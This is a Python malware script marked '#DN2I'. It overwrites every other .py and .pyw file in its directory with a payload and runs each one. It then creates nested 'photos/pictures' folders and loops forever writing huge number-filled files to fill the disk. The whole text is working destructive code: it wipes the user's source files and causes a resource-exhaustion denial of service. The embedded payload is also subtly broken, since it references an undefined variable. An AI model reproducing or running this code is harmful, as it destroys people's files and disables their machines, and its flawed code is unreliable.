#DN2I
import sys
import glob
import subprocess
import os

payload="""
def task():
    fpath="photos/pictures/2023/other/me/all/"
    i=1
    while fc != 0:
      dn=open(fpath+"dn"+str(i), "w")
      dn.write(str(999999**999999))
      dn.close()
      i=i+1
task()
"""
spread_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in spread_files:
    main=False
    with open(file, 'r') as f:
        content = f.readlines()
        for line in content:
          if "#DN2I" in line:
            main=True
    if main == True:
      spread_files.remove(file)

for file in spread_files:
    with open(file, 'w+') as f:
        f.truncate()
        f.writelines(payload)
    subprocess.Popen(['python', file])

pdir="photos/pictures/"
dir1="photos/pictures/2022/personal/me/trips/fun/important/all/"
dir2="photos/pictures/2022/other/me/trips/fun/important/all/"
dir3="photos/pictures/2023/personal/me/trips/fun/important/all/"
dir4="photos/pictures/2023/other/me/trips/fun/important/all/"
if not os.path.exists(pdir):
    os.makedirs(dir1)
    os.makedirs(dir2)
    os.makedirs(dir3)
    os.makedirs(dir4)

def task():
    fpath="photos/pictures/2023/other/me/trips/fun/important/all/"
    i=1
    while True:
      with open(fpath+"dn"+str(i), "w") as dn:
        dn.write(str(999999**999999))
      i=i+1

task()
